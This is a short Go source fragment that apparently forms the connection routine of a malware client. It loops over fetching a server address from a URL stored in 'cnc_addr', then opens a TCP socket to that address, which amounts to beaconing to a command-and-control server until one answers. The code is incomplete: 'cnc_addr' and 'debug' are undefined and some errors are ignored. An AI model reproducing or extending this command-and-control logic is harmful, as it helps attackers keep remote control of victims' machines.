package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
)

func init_socket() net.Conn {
	for {
		res, err := http.Get(cnc_addr)
		resp, err := ioutil.ReadAll(res.Body)
		sock, err := net.Dial("tcp", string(resp))

		if err != nil {
			continue
		}

		debug(fmt.Sprintf("Socket initialized --> %s", sock.RemoteAddr()))
		return sock
	}
}
